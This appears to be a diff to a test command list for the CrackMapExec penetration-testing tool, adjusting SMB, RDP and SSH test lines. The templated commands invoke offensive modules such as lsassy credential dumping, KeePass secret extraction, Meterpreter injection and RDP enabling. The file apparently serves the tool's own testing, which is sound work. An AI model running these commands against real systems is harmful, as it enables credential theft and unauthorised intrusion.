@@ -1,5 +1,5 @@
 ##### SMB
-crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --shares
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --shares --filter-shares READ WRITE
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --pass-pol
@@ -44,11 +44,12 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M hash_spider
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M impersonate
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M install_elevated
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M ioxidresolver
-crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_discover
-crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger -o ACTION=ALL USER=USERNAME KEEPASS_CONFIG_PATH="C:\\Users\\USERNAME\\AppData\\Roaming\\KeePass\\KeePass.config.xml"
+# currently hanging indefinitely - TODO: look into this
+#crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_discover
+#crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger -o ACTION=ALL USER=USERNAME KEEPASS_CONFIG_PATH="C:\\Users\\USERNAME\\AppData\\Roaming\\KeePass\\KeePass.config.xml"
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M lsassy
 # You must replace this with the proper CA information!
-crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M masky -o CA="host.domain.tld\domain-host-CA"
+#crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M masky -o CA="host.domain.tld\domain-host-CA"
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M ms17-010
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M msol
@@ -189,3 +190,7 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
 ##### RDP
 crackmapexec rdp TARGET -u USERNAME -p PASSWORD KERBEROS
 crackmapexec rdp TARGET -u USERNAME -p PASSWORD KERBEROS --nla-screenshot
+##### SSH - Uncomment these lines to test SSH; requires the private key "test_key" in the local directory
+#crackmapexec ssh TARGET -u USERNAME -p PASSWORD KERBEROS
+#crackmapexec ssh TARGET -u USERNAME -p PASSWORD --key-file test_key
+#crackmapexec ssh TARGET -u USERNAME --key-file test_key
